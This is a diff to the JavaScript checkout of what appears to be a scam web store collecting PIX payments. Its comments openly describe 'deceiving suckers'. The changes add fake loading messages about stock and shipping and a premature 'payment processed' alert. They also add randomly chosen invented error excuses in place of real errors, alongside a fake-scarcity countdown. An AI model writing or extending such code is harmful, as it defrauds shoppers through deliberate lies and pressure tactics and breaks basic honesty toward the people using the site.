@@ -104,7 +104,7 @@ function setupCheckout() {
     if (countdownEl) countdownEl.textContent = `00:${m}:${s}`
     remaining -= 1
     if (remaining < 0) { 
-      alert('Tempo esgotado! Seu kit voltou ao estoque.')
+      alert('⏰ Tempo esgotado! Seu kit voltou ao estoque.')
       window.location.href = 'index.html'
       return 
     }
@@ -239,13 +239,13 @@ function setupCheckout() {
         navigator.clipboard.writeText(pixCode.textContent)
           .then(() => {
             const originalText = copyPixBtn.textContent
-            copyPixBtn.textContent = 'Copiado!'
+            copyPixBtn.textContent = '✅ Código copiado!'
             setTimeout(() => {
               copyPixBtn.textContent = originalText
-            }, 2000)
+            }, 3000)
           })
           .catch(() => {
-            alert('Erro ao copiar. Selecione e copie manualmente.')
+            alert('❌ Erro ao copiar. Selecione e copie manualmente.')
           })
       }
     })
@@ -254,7 +254,7 @@ function setupCheckout() {
   if (confirmBtn) {
     confirmBtn.addEventListener('click', async () => {
       if (!validateCheckout()) {
-        alert('Preencha todos os campos corretamente!')
+        alert('⚠️ Preencha todos os campos corretamente!')
         return
       }
 
@@ -317,22 +317,23 @@ function setupCheckout() {
         }
       }
 
-      // MENSAGENS ENGANOSAS PRA OTÁRIOS
+      // MENSAGENS BLACK - ENGANANDO OTÁRIOS
       const loadingMessages = [
-        "Processando seu pedido...",
-        "Gerando código PIX...", 
-        "Quase lá...",
-        "Preparando tudo...",
-        "Só um momento...",
-        "Finalizando...",
-        "Muitos pedidos, aguarde..."
+        "🎄 Processando seu Natal...",
+        "📦 Confirmando estoque...", 
+        "🚚 Calculando frete...",
+        "💰 Gerando PIX...",
+        "⏳ Quase lá...",
+        "🎁 Preparando seus brindes...",
+        "🔥 Muitos pedidos, aguarde...",
+        "✅ Finalizando..."
       ]
       
       let messageIndex = 0
       const loadingInterval = setInterval(() => {
         confirmBtn.textContent = loadingMessages[messageIndex]
         messageIndex = (messageIndex + 1) % loadingMessages.length
-      }, 2000)
+      }, 1800)
       
       confirmBtn.disabled = true
       confirmBtn.textContent = loadingMessages[0]
@@ -348,16 +349,13 @@ function setupCheckout() {
 
         if (!res.ok) {
           const errorData = await res.json().catch(() => ({}))
-          throw new Error(errorData.error || errorData.message || `Erro ${res.status}`)
+          const errorMsg = errorData.message || 'Sistema temporariamente indisponível'
+          throw new Error(`❌ ${errorMsg}`)
         }
 
         const data = await res.json()
         
-        // VERIFICA SE É PIX SIMULADO
-        if (data.status === "simulated_due_to_timeout") {
-          throw new Error("Sistema ocupado. Tente novamente em instantes.")
-        }
-        
+        // SÓ CHEGA AQUI SE CYBERHUB RESPONDEU
         const amountBRL = amountCents / 100
         if (pixAmountEl) pixAmountEl.textContent = formatCurrencyBRL(amountBRL)
         
@@ -371,15 +369,30 @@ function setupCheckout() {
         if (pixInfo) {
           pixInfo.style.display = ''
           pixInfo.scrollIntoView({ behavior: 'smooth' })
+          
+          // MENSAGEM DE SUCESSO BLACK
+          setTimeout(() => {
+            alert('🎉 Pagamento processado! Escaneie o QR Code para finalizar.')
+          }, 500)
         }
 
       } catch (error) {
         clearInterval(loadingInterval)
         console.error('Erro no pagamento:', error)
-        alert(`Ops! ${error.message}`)
+        
+        // MENSAGENS DE ERRO BLACK
+        const errorMessages = [
+          '❌ Sistema ocupado no momento',
+          '⚠️ Tente novamente em instantes', 
+          '🔧 Estamos com muitos pedidos',
+          '💸 Problema temporário no pagamento'
+        ]
+        
+        const randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)]
+        alert(randomError)
       } finally {
         confirmBtn.disabled = false
-        confirmBtn.textContent = 'Pagar e confirmar envio'
+        confirmBtn.textContent = '💳 Pagar e confirmar envio'
       }
     })
   }
